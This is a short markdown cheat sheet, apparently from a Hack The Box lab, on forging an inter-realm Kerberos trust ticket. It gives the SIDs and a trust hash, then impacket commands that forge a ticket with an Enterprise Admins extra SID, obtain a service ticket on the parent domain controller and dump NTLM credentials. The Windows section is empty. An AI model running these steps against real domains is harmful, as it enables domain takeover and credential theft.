

## Attack via Inter-Real Ticket ! 
[Read_Blog](https://mayfly277.github.io/posts/GOADv2-pwning-part12/#trust-ticket---forge-inter-realm-tgt)


What we need to :

Domain-Sid :: S-1-5-21-2034262909-2733679486-179904498

EA-Sid :: S-1-5-21-4084500788-938703357-3654145966-519[519 --> Rid of EA]

Rc4 Hash :: b8577d1ec55fd7e4345be7c24647dc06



### LINUX

1 . Forge the ticket .

```zsh
impacket-ticketer -nthash b8577d1ec55fd7e4345be7c24647dc06 -domain-sid S-1-5-21-2034262909-2733679486-179904498 -domain corp.ghost.htb -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -spn krbtgt/ghost.htb escape
```

```zsh
export KRB5CCNAME=escape.ccache
```


2 . Now we will use the forged TGT to ask a ST on the parent domain.

```zsh
impacket-getST -k -no-pass -spn cifs/DC01.ghost.htb ghost.htb/escape@ghost.htb -debug
```

```zsh
export KRB5CCNAME=escape@ghost.htb@cifs_DC01.ghost.htb@GHOST.HTB.ccache
```


3 .  And now we can use our service ticket to dump credentials . 

```zsh
impacket-secretsdump -k -no-pass escape@DC01.ghost.htb -just-dc-ntlm
```

#### WINDOWS

